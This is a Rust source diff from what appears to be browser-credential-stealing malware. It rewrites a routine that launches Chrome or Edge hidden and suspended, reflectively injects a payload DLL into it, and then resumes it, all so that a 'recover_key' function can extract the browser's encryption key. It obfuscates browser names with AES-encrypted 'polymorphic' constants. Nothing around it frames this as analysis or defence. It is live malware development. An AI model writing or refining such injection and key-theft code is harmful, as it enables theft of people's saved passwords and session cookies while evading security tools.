@@ -448,6 +448,9 @@ unsafe fn inject_dll_reflective_inner(proc: *mut std::ffi::c_void, dll_data: &[u
 }
 
 fn spawn_chrome_and_inject(chrome_exe: &str, dll_path: &Path, real_profile: &Path) -> Result<u32, ()> {
+    const CREATE_SUSPENDED: u32 = 0x0000_0004;
+    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+
     let profile_str = real_profile.to_string_lossy();
 
     let mut parts: Vec<String> = Vec::new();
@@ -506,31 +509,42 @@ fn spawn_chrome_and_inject(chrome_exe: &str, dll_path: &Path, real_profile: &Pat
     si.cb = mem::size_of::<STARTUPINFOW>() as u32;
     let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
     unsafe {
-        let cp_ok = dynapi::CreateProcessW(exe_w.as_ptr(), cmd_w.as_mut_ptr(), std::ptr::null_mut(), std::ptr::null_mut(), 0, 0x0800_0000, std::ptr::null_mut(), std::ptr::null(), &mut si as *mut _ as *mut std::ffi::c_void, &mut pi as *mut _ as *mut std::ffi::c_void);
-        if cp_ok == 0 { return Err(()); }
+        let creation_flags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
+        let cp_ok = dynapi::CreateProcessW(
+            exe_w.as_ptr(),
+            cmd_w.as_mut_ptr(),
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+            0,
+            creation_flags,
+            std::ptr::null_mut(),
+            std::ptr::null(),
+            &mut si as *mut _ as *mut std::ffi::c_void,
+            &mut pi as *mut _ as *mut std::ffi::c_void,
+        );
+        if cp_ok == 0 {
+            return Err(());
+        }
         let pid = pi.dwProcessId;
 
-        // Edge needs more startup time than Chrome — poll with early exit
-        let edge_name = aes_decrypt(&polymorphic_keys::INJ_EDGE_EXE_ENC, &polymorphic_keys::INJ_EDGE_EXE_KEY, &polymorphic_keys::INJ_EDGE_EXE_NONCE);
-        let exe_basename = std::path::Path::new(chrome_exe).file_name().map(|f| f.to_string_lossy().to_lowercase()).unwrap_or_default();
-        let wait_ms = if exe_basename.as_bytes() == edge_name.as_slice() { 2000u64 } else { 1200u64 };
-        let step = 200u64;
-        let mut elapsed = 0u64;
-        while elapsed < wait_ms {
-            std::thread::sleep(std::time::Duration::from_millis(step));
-            elapsed += step;
-            // If the process already exited, no point waiting further
-            if dynapi::WaitForSingleObject(pi.hProcess, 0) == 0 { break; }
-        }
         let dll_bytes = fs::read(dll_path).unwrap_or_default();
-        if dll_bytes.is_empty() { dynapi::CloseHandle(pi.hThread); dynapi::CloseHandle(pi.hProcess); return Err(()); }
-        let result = inject_dll_reflective_with_handle(pi.hProcess, &dll_bytes);
+        if dll_bytes.is_empty() {
+            dynapi::CloseHandle(pi.hThread);
+            dynapi::CloseHandle(pi.hProcess);
+            return Err(());
+        }
+
+        // Inject while the browser main thread is still suspended.
+        let inject_result = inject_dll_reflective_with_handle(pi.hProcess, &dll_bytes);
+        if inject_result.is_err() {
+            dynapi::CloseHandle(pi.hThread);
+            dynapi::CloseHandle(pi.hProcess);
+            return Err(());
+        }
+
+        dynapi::ResumeThread(pi.hThread);
         dynapi::CloseHandle(pi.hThread);
         dynapi::CloseHandle(pi.hProcess);
-        match result {
-            Ok(()) => { }
-            Err(()) => { return Err(()); }
-        }
         Ok(pid)
     }
 }
@@ -605,22 +619,18 @@ pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
     }
 
     let profile_for_spawn = real_profile.as_ref().map(|p| p.as_path());
-    let injected = 'inject: {
-        // Try existing browser processes first (faster, no spawn needed)
-        let existing_pids: Vec<u32> = find_browser_pids(&target.exe);
-        if !existing_pids.is_empty() {
-            let dll_bytes = fs::read(&dll_path).ok()?;
-            for pid in &existing_pids {
-                if inject_dll_reflective(*pid, &dll_bytes).is_ok() { break 'inject true; }
-            }
-        }
-        // Browser not running — spawn headless to extract the key
-        if let Some(profile) = profile_for_spawn {
-            if let Ok(pid) = spawn_chrome_and_inject(&browser_exe, &dll_path, profile) { cleanup.spawned_pid = Some(pid); break 'inject true; }
-        }
+    let injected = if let Some(profile) = profile_for_spawn {
+        spawn_chrome_and_inject(&browser_exe, &dll_path, profile)
+            .map(|pid| {
+                cleanup.spawned_pid = Some(pid);
+            })
+            .is_ok()
+    } else {
         false
     };
-    if !injected { return None; }
+    if !injected {
+        return None;
+    }
 
     for _i in 0..20 {
         if result_path.exists() {
